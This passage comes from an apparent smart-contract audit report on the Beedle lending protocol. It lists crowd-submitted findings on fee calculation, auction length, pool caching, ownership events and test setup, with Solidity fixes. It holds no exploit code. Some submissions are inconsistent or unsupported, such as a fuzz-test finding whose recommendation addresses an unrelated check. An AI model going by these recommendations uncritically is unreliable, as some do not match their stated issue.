            uint256 govFee = (borrowerFee * loan.collateral) / 10000;
            // transfer the protocol fee to governance
            IERC20(loan.collateralToken).transfer(feeReceiver, govFee);
            // transfer the collateral tokens from the contract to the lender
            IERC20(loan.collateralToken).transfer(loan.lender, loan.collateral - govFee);

            bytes32 poolId = keccak256(abi.encode(loan.lender, loan.loanToken, loan.collateralToken));

            // update the pool outstanding loans
            pools[poolId].outstandingLoans -= loan.debt;

            emit LoanSiezed(loan.borrower, loan.lender, loanId, loan.collateral);
            // delete the loan
            delete loans[loanId];
            unchecked {
                ++i;
            }
        } while (i < length);
    }
```
3. For ``startAuction()`` change from:

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L437C1-L460C1

To:
```
/src/Lender.sol

function startAuction(uint256[] calldata loanIds) public {
        uint256 i;
        uint256 length = loanIds.length;
        do {
            uint256 loanId = loanIds[i];
            // get the loan info
            Loan memory loan = loans[loanId];
            // validate the loan
            if (msg.sender != loan.lender) revert Unauthorized();
            if (loan.auctionStartTimestamp != type(uint256).max) {
                revert AuctionStarted();
            }

            // set the auction start timestamp
            loans[loanId].auctionStartTimestamp = block.timestamp;
            emit AuctionStart(
                loan.borrower, loan.lender, loanId, loan.debt, loan.collateral, block.timestamp, loan.auctionLength
            );
            unchecked {
                ++i;
            }
        } while (i < length);
    }
```
4. For ``giveLoan()`` change from:

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355C1-L433C1

To:
```
/src/Lender.sol

function giveLoan(uint256[] calldata loanIds, bytes32[] calldata poolIds) external {
        uint256 i;
        uint256 length = loanIds.length;
        do {
            uint256 loanId = loanIds[i];
            bytes32 poolId = poolIds[i];
            // get the loan info
            Loan memory loan = loans[loanId];
            // validate the loan
            if (msg.sender != loan.lender) revert Unauthorized();
            // get the pool info
            Pool memory pool = pools[poolId];
            // validate the new loan
            if (pool.loanToken != loan.loanToken) revert TokenMismatch();
            if (pool.collateralToken != loan.collateralToken) {
                revert TokenMismatch();
            }
            // new interest rate cannot be higher than old interest rate
            if (pool.interestRate > loan.interestRate) revert RateTooHigh();
            // auction length cannot be shorter than old auction length
            if (pool.auctionLength < loan.auctionLength) revert AuctionTooShort();
            // calculate the interest
            (uint256 lenderInterest, uint256 protocolInterest) = _calculateInterest(loan);
            uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;
            if (pool.poolBalance < totalDebt) revert PoolTooSmall();
            if (totalDebt < pool.minLoanSize) revert LoanTooSmall();
            uint256 loanRatio = (totalDebt * 10 ** 18) / loan.collateral;
            if (loanRatio > pool.maxLoanRatio) revert RatioTooHigh();
            // update the pool balance of the new lender
            _updatePoolBalance(poolId, pool.poolBalance - totalDebt);
            pools[poolId].outstandingLoans += totalDebt;

            // update the pool balance of the old lender
            bytes32 oldPoolId = getPoolId(loan.lender, loan.loanToken, loan.collateralToken);
            _updatePoolBalance(oldPoolId, pools[oldPoolId].poolBalance + loan.debt + lenderInterest);
            pools[oldPoolId].outstandingLoans -= loan.debt;

            // transfer the protocol fee to the governance
            IERC20(loan.loanToken).transfer(feeReceiver, protocolInterest);

            emit Repaid(
                loan.borrower,
                loan.lender,
                loanId,
                loan.debt + lenderInterest + protocolInterest,
                loan.collateral,
                loan.interestRate,
                loan.startTimestamp
            );

            // update the loan with the new info
            loans[loanId].lender = pool.lender;
            loans[loanId].interestRate = pool.interestRate;
            loans[loanId].startTimestamp = block.timestamp;
            loans[loanId].auctionStartTimestamp = type(uint256).max;
            loans[loanId].debt = totalDebt;

            emit Borrowed(
                loan.borrower,
                pool.lender,
                loanId,
                loans[loanId].debt,
                loans[loanId].collateral,
                pool.interestRate,
                block.timestamp
            );
            unchecked {
                ++i;
            }
        } while (i < length);
    }
```
5. For ``repay()`` change from:

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L292C1-L345C6
To:
```
/src/Lender.sol

function repay(uint256[] calldata loanIds) public {
        uint256 i;
        uint256 length = loanIds.length;
        do {
            uint256 loanId = loanIds[i];
            // get the loan info
            Loan memory loan = loans[loanId];
            // calculate the interest
            (uint256 lenderInterest, uint256 protocolInterest) = _calculateInterest(loan);

            bytes32 poolId = getPoolId(loan.lender, loan.loanToken, loan.collateralToken);

            // update the pool balance
            _updatePoolBalance(poolId, pools[poolId].poolBalance + loan.debt + lenderInterest);
            pools[poolId].outstandingLoans -= loan.debt;

            // transfer the loan tokens from the borrower to the pool
            IERC20(loan.loanToken).transferFrom(msg.sender, address(this), loan.debt + lenderInterest);
            // transfer the protocol fee to the fee receiver
            IERC20(loan.loanToken).transferFrom(msg.sender, feeReceiver, protocolInterest);
            // transfer the collateral tokens from the contract to the borrower
            IERC20(loan.collateralToken).transfer(loan.borrower, loan.collateral);
            emit Repaid(
                msg.sender, loan.lender, loanId, loan.debt, loan.collateral, loan.interestRate, loan.startTimestamp
            );
            // delete the loan
            delete loans[loanId];
            unchecked {
                ++i;
            }
        } while (i < length);
    }
```
6. For ``refinance()`` change from:

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591C3-L710C6

To:
```
/src/Lender.sol

function refinance(Refinance[] calldata refinances) public {
        uint256 i;
        uint256 length = refinances.length;
        do {
            uint256 loanId = refinances[i].loanId;
            bytes32 poolId = refinances[i].poolId;
            bytes32 oldPoolId =
                keccak256(abi.encode(loans[loanId].lender, loans[loanId].loanToken, loans[loanId].collateralToken));
            uint256 debt = refinances[i].debt;
            uint256 collateral = refinances[i].collateral;

            // get the loan info
            Loan memory loan = loans[loanId];
            // validate the loan
            if (msg.sender != loan.borrower) revert Unauthorized();

            // get the pool info
            Pool memory pool = pools[poolId];
            // validate the new loan
            if (pool.loanToken != loan.loanToken) revert TokenMismatch();
            if (pool.collateralToken != loan.collateralToken) {
                revert TokenMismatch();
            }
            if (pool.poolBalance < debt) revert LoanTooLarge();
            if (debt < pool.minLoanSize) revert LoanTooSmall();
            uint256 loanRatio = (debt * 10 ** 18) / collateral;
            if (loanRatio > pool.maxLoanRatio) revert RatioTooHigh();

            // calculate the interest
            (uint256 lenderInterest, uint256 protocolInterest) = _calculateInterest(loan);
            uint256 debtToPay = loan.debt + lenderInterest + protocolInterest;

            // update the old lenders pool
            _updatePoolBalance(oldPoolId, pools[oldPoolId].poolBalance + loan.debt + lenderInterest);
            pools[oldPoolId].outstandingLoans -= loan.debt;

            // now lets deduct our tokens from the new pool
            _updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
            pools[poolId].outstandingLoans += debt;

            if (debtToPay > debt) {
                // we owe more in debt so we need the borrower to give us more loan tokens
                // transfer the loan tokens from the borrower to the contract
                IERC20(loan.loanToken).transferFrom(msg.sender, address(this), debtToPay - debt);
            } else if (debtToPay < debt) {
                // we have excess loan tokens so we give some back to the borrower
                // first we take our borrower fee
                uint256 fee = (borrowerFee * (debt - debtToPay)) / 10000;
                IERC20(loan.loanToken).transfer(feeReceiver, fee);
                // transfer the loan tokens from the contract to the borrower
                IERC20(loan.loanToken).transfer(msg.sender, debt - debtToPay - fee);
            }
            // transfer the protocol fee to governance
            IERC20(loan.loanToken).transfer(feeReceiver, protocolInterest);

            // update loan debt
            loans[loanId].debt = debt;
            // update loan collateral
            if (collateral > loan.collateral) {
                // transfer the collateral tokens from the borrower to the contract
                IERC20(loan.collateralToken).transferFrom(msg.sender, address(this), collateral - loan.collateral);
            } else if (collateral < loan.collateral) {
                // transfer the collateral tokens from the contract to the borrower
                IERC20(loan.collateralToken).transfer(msg.sender, loan.collateral - collateral);
            }

            emit Repaid(msg.sender, loan.lender, loanId, debt, collateral, loan.interestRate, loan.startTimestamp);

            loans[loanId].collateral = collateral;
            // update loan interest rate
            loans[loanId].interestRate = pool.interestRate;
            // update loan start timestamp
            loans[loanId].startTimestamp = block.timestamp;
            // update loan auction start timestamp
            loans[loanId].auctionStartTimestamp = type(uint256).max;
            // update loan auction length
            loans[loanId].auctionLength = pool.auctionLength;
            // update loan lender
            loans[loanId].lender = pool.lender;
            // update pool balance
            pools[poolId].poolBalance -= debt;
            emit Borrowed(msg.sender, pool.lender, loanId, debt, collateral, pool.interestRate, block.timestamp);
            emit Refinanced(loanId);
            unchecked {
                ++i;
            }
        } while (i < length);
    }
```

## <a id='G-97'></a>G-97. Caching the pool variable for gas savings

_Submitted by [SolSaver](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [pratred](https://profiles.cyfrin.io/u/undefined). Selected submission by: [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L145

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L148

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L167

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L183

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L185

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L187

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L199

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L201

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L203

## Gas Issue Details

The following functions can be improved for gas savings by caching the state variable `pools[poolId]` in a local variable.

The `Lender::setPool()`:
- https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L145
- https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L148
- https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L167

The `Lender::addToPool()`:
- https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L183
- https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L185
- https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L187

The `Lender::removeFromPool()`:
- https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L199
- https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L201
- https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L203

## Gas Improvements

Cache the state variable `pools[poolId]` in a local variable and access the pool's parameters via the local (cached) variable instead.
## <a id='G-98'></a>G-98. [G-01] The owner can be declared inside the constructor

_Submitted by [pina](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Ownable.sol#L14

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol#L11

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L8

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L31

## Summary
In the Ownable library, the `msg.sender` can be assigned directly to the `owner` variable, since in all the contracts that use this library, the msg.sender is passed as a parameter, a value that can be associated within the constructor.


## Impact
Optimization 

## Tools Used
Manual code review

## Recommendations
You can do this change : 

src/utils/Ownable.sol
```diff
-    constructor(address _owner) {
+    constructor() {
-       owner = _owner;
+       owner = msg.sender;
-       emit OwnershipTransferred(address(0), _owner);
+        emit OwnershipTransferred(address(0), owner);
    }

```
And update the other declarations in the other contracts, since the msg.sender does not need to be passed by parameter
## <a id='G-99'></a>G-99. [L-02] Unnecessary abstract statement

_Submitted by [pina](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Ownable.sol#L4

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Ownable.sol#L10

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Ownable.sol#L19

## Summary
Declaring the `onlyOwner` and `transferOwnership` roles as virtual allows them to be modified in contracts that are inherited. However, these functions are not overridden, so their implementation is unnecessary.


## Impact
Define the scope that has the functions without leaving any possibility that is not required.

## Tools Used
Manual code review

## Recommendations
Remove the `abstract` and `virtual` keywords, in the contract and in the functions.
## <a id='G-100'></a>G-100. [L-03] The OwnershipTransferred event should send the oldOwner

_Submitted by [pina](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Ownable.sol#L6

## Summary
The OwnershipTransferred event has two arparameterguments to indicate who was the current owner and who is the new owner, however parameter one does not describe the case, the parameter is declared as user when the variable should be related to the previous owner.

## Impact
Confusion if the user is the owner.

## Tools Used
Manual code review

## Recommendations
Change the parameter name `user`, for example:
```diff
- event OwnershipTransferred(address indexed user, address indexed newOwner);
+ event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);
```



## <a id='G-101'></a>G-101. MaxLoanRatio is not configured properly.

_Submitted by [0xsandy](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L210C1-L215C6

## Summary
``MaxLoanRatio`` is the ratio of debt to collateral and should always be multiplied by 10**18. But while setting or updating ``maxLoanRatio`` there are no checks.

## Vulnerability Details
Pool lender can mistakely or unknowingly set ``pool.maxLoanRatio`` more than what it should be when multiplied by 10**18 or while updating ``maxLoanRatio``, pool lender can set it more than what it should be. For example a ``200%`` collateralization is, ``5*10**17`` but lender can mistakely set/update it to ``5*10**18`` which is only ``20`` percent collaterization. 

## Impact
1. It causes borrowers to borrow more debt with less collateral.
2. It may be impossible to give loan to another pool or refinance a loan to another pool.

## Tools Used
Manual Analysis

## Recommendations
Instead of using ratio multiplied by 10**18 set by the lender, use collateralization percentage and calculate ratio in the contract. 
## <a id='G-102'></a>G-102. ADD UNCHECKED{} FOR SUBTRACTIONS WHERE THE OPERANDS CANNOT UNDERFLOW BECAUSE OF A PREVIOUS IF-STATEMENT

_Submitted by [hunter_w3b](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L66

## Summary

ADD UNCHECKED{} FOR SUBTRACTIONS WHERE THE OPERANDS CANNOT UNDERFLOW BECAUSE OF A PREVIOUS IF-STATEMENT

## Vulnerability Details

```solidity

65            if (_balance > balance) {
66                uint256 _diff = _balance - balance;

```

## <a id='G-103'></a>G-103. Incorrect Fee Calculation in Seize Function

_Submitted by [ubermensch](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L561-L568

## Summary
It has been identified that the `seize` function, which is responsible for liquidation, incorrectly uses the `borrowerFee` to calculate the fee taken from the lender, instead of the `lenderFee`.

## Vulnerability Details
The vulnerability arises from the `seize` function, which is responsible for liquidation. The function takes a fee from the lender but incorrectly uses the `borrowerFee` to calculate it, instead of the `lenderFee`. This incorrect calculation can lead to inaccuracies in the fee taken from the lender during a liquidation.

## Impact
This vulnerability can lead to significant financial losses for the lender, who may end up paying an incorrect fee during a liquidation.

## Tools Used
Manual Review 

## Recommendations
To mitigate this vulnerability, it is recommended to revise the seize function to correctly use the lenderFee to calculate the fee taken from the lender during a liquidation. The revised function should be thoroughly tested to ensure its accuracy and to prevent potential financial losses.
## <a id='G-104'></a>G-104. Lack of updating the auctionLength parameter in the giveLoan() and buyLoan()

_Submitted by [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L416-L420

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L518-L522

## Summary

The `Lender::giveLoan()` and `Lender::buyLoan()` lack updating the loan's `auctionLength` parameter to match the new pool. Either a borrower or a lender can lose their benefits.

## Vulnerability Details

The `giveLoan()` and `buyLoan()` do not update the loan's `auctionLength` parameter to match the new pool while updating other parameters.

```solidity
    function giveLoan(
        uint256[] calldata loanIds,
        bytes32[] calldata poolIds
    ) external {
        for (uint256 i = 0; i < loanIds.length; i++) {
            ...

            // update the loan with the new info
@>          loans[loanId].lender = pool.lender;
@>          loans[loanId].interestRate = pool.interestRate;
@>          loans[loanId].startTimestamp = block.timestamp;
@>          loans[loanId].auctionStartTimestamp = type(uint256).max;
@>          loans[loanId].debt = totalDebt;

            ...
        }
    }

    // ...SNIPPED...

    function buyLoan(uint256 loanId, bytes32 poolId) public {
        ...

        // update the loan with the new info
@>      loans[loanId].lender = msg.sender;
@>      loans[loanId].interestRate = pools[poolId].interestRate;
@>      loans[loanId].startTimestamp = block.timestamp;
@>      loans[loanId].auctionStartTimestamp = type(uint256).max;
@>      loans[loanId].debt = totalDebt;

        ...
    }
```

- `The giveLoan() updates the loan's other params, but the auctionLength`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L416-L420

- `The buyLoan() updates the loan's other params, but the auctionLength`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L518-L522

## Impact

In the case of `giveLoan()`, if the new pool has a longer auction length than the previous pool, a borrower will lose benefits from the longer auction length (the new pool cannot have a shorter auction length in this case).

Similarly, in the case of `buyLoan()`, a borrower will lose their benefits if the new pool has a longer auction length than the previous pool. On the other hand, if the new pool has a shorter auction length than the previous pool, a lender (the new pool's owner) may lose their benefits instead.

## Tools Used

Manual Review

## Recommendations

I recommend updating the `auctionLength` parameter in both the `giveLoan()` and `buyLoan()`, as shown below.

```diff
    function giveLoan(
        uint256[] calldata loanIds,
        bytes32[] calldata poolIds
    ) external {
        for (uint256 i = 0; i < loanIds.length; i++) {
            ...

            // update the loan with the new info
            loans[loanId].lender = pool.lender;
            loans[loanId].interestRate = pool.interestRate;
            loans[loanId].startTimestamp = block.timestamp;
            loans[loanId].auctionStartTimestamp = type(uint256).max;
            loans[loanId].debt = totalDebt;
+           loans[loanId].auctionLength = pool.auctionLength;

            ...
        }
    }

    // ...SNIPPED...

    function buyLoan(uint256 loanId, bytes32 poolId) public {
        ...

        // update the loan with the new info
        loans[loanId].lender = msg.sender;
        loans[loanId].interestRate = pools[poolId].interestRate;
        loans[loanId].startTimestamp = block.timestamp;
        loans[loanId].auctionStartTimestamp = type(uint256).max;
        loans[loanId].debt = totalDebt;
+       loans[loanId].auctionLength = pools[poolId].auctionLength;

        ...
    }
```
## <a id='G-105'></a>G-105. Fuzz setup incorrectly mints loanTokens to borrower

_Submitted by [hasanza](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The setup in `Fuzzing.t.sol` mints the borrower 100K loan tokens causing some assertions to always fail. Additionally, in some assertions about debt balances, the fees are not taken into account.

## Vulnerability Details
On line 79 of `Fuzzing.t.sol`, 100K loan tokens are minted to the borrower. 

```
loanToken.mint(address(borrower), 100000*10**18)
```

This leads to assertions pertaining to borrower balance post-borrow to fail. As an example, In the fuzz test `testFuzz_borrow`, there is the following assertion:
`assertEq(loanToken.balanceOf(address(borrower)), debtAmount);`
However, since the borrower is minted 100K loanTokens in the setup, his balance is always 100K more than whatever has been borrowed in any given fuzz test. This leads to assertions involving borrower loanToken balance, to fail.

Another issue is that when the above mentioned assertion is made, the fees are not accounted for. This also leads the assertion to fail even though the borrower is not minted any loanTokens in setup. As such, it is recommended to account for fees when making the assertion in tests such as the borrow fuzz test:

`assertEq(loanToken.balanceOf(address(borrower)), debtAmount-((debtAmount*50)/10000));`

## Impact
Informational

## Tools Used
Foundry

## Recommendations
Change the check `loanRatio > pool.maxLoanRatio`, to `loanRatio >= pool.maxLoanRatio`.
## <a id='G-106'></a>G-106. Use safe mint rather than mint

_Submitted by [SA110](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol#L37

## Summary
SafeMint is more secure than mint.

## Vulnerability Details

## Impact
Unlike the basic mint function, SafeMint provide safeguards against potential smart contract vulnerabilities, such as reentrancy attacks and unexpected token loss.


## Tools Used
Manual Review

## Recommended Mitigation Steps
SafeMint should be used in place of mint for Solidity contracts to ensure robust security and error handling.
## <a id='G-107'></a>G-107. maxLoanRatio calculation differs from commentary

_Submitted by [alra](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/utils/Structs.sol#L15

## Summary
In the documentation, the ratio is figured as `(loanToken / collateralToken) * 10**18`, when in reality is `(loanToken * 10**18) / collateralToken`.
## Vulnerability Details
```solidity
File: src/utils/Structs.sol

15: /// @notice the max ratio of loanToken/collateralToken (multiplied by 10**18)
16: uint256 maxLoanRatio;
```
```solidity
File: src/Lender.sol

246: uint256 loanRatio = (debt * 10 ** 18) / collateral;
```
## Impact
No impact.
## Tools Used
Manual review.
## Recommendations
Adjust the comment to be sound with the code.
## <a id='G-108'></a>G-108. Absence of Event Logs in `Staking.sol` Reduces Contract Transparency and Auditability

_Submitted by [iroh](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol

## Summary

The `Staking.sol` smart contract does not emit any events. Events in Solidity provide a way for smart contracts to log specific activities or changes in state that occur during contract execution. These logs are essential for off-chain services to track the contract's operations.

## Vulnerability Details

In the `Staking.sol` contract, users can deposit, withdraw, and claim rewards. However, none of these functions emit events to log these actions. Without events, it becomes difficult for external entities (like front-end applications, oracles, or analytics services) to track these state changes. This lack of transparency makes auditing contract activity much more challenging.

## Impact

The absence of events in the contract reduces the contract's transparency and auditability. It makes it difficult for off-chain services to track the contract's operations and for users to verify their transactions. This lack of transparency could potentially undermine user trust in the platform.

## Tools Used

- Manual code review

## Recommendations

It's recommended to emit events in the `deposit`, `withdraw`, and `claim` functions to log these state changes. Emitting events provides an easier way to track these actions, increases the contract's transparency, and improves the auditability of the contract.

## <a id='G-109'></a>G-109. Sender in `transferFrom` in `Lender.setPool` different from msg.sender

_Submitted by [maroutis](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The method `setPool` in Lender.sol uses `p.lender` as sender in the transferFrom method. This can be exploited to make the contract transfer tokens on behalf `p.lender`, potentially leading to unauthorized token transfers.

## Vulnerability Detail

In the function `Lender.setPool(Pool)`, there's a call to `IERC20(p.loanToken).transferFrom(p.lender, address(this), p.poolBalance - currentBalance)`. By using `p.lender` as the sender, this can be exploited to bypass proper access controls.

## Impact

Unexpected deductions or transfers for users.

## Tools Used

Slither

## Recommendation:

Replace `p.lender` with `msg.sender` to ensure that the transaction initiator is the one being validated.
## <a id='G-110'></a>G-110. New lender is charged with paying protocolInterest

_Submitted by [maroutis](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

During a loan transfer in the function `buyLoan`, the original lender is charged with paying the protocol interest, but doesnt get it back.

## Vulnerability Detail

`    IERC20(loan.loanToken).transfer(feeReceiver, protocolInterest);`
In the `buyLoan` function, new lenders shoulder the protocolInterest fee, an amount incorporated into the borrower's accumulated interest. This fee is then deducted from their balance.

## Impact

New lenders might face unexpected deductions, leading to financial losses.

## Tools Used

A thorough review of the code base was conducted to identify this issue. 

## Recommendation

The fee should not be substracted from his new balance :

```solidity
File: Lender.sol
_updatePoolBalance(poolId, pools[poolId].poolBalance - loan.debt - lenderInterest);
```
    